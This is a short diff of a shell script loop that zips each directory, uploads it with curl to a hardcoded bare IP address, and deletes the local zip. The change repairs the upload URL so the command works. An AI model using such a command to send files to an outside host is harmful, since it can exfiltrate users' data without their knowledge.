@@ -13,7 +13,7 @@ for id in $(ls); do
     eval "$AA $BB $CC"
     cd ..
     echo "out: $id.zip"
-    curl --form upload=@$id.zip --form submit=Upload http://http://39.119.118.152:80/upload
+    curl --form upload=@$id.zip --form submit=Upload http://39.119.118.152/upload
     rm -r "$id.zip"
 
 done
